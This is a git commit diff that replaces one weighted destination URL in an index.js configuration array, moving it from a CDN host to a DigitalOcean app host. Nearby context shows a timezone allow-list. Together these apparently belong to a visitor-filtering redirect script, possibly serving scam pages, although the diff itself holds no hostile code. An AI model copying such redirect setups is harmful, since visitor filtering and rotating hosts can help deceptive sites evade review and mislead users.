ccad4fa78bef835b60c6400a4ac1eed359046f2d
paalakash <palaksh452@gmail.com>
2026-06-30 11:03:35 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://undifiiii.b-cdn.net/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://stingray-app-2-ipmtp.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
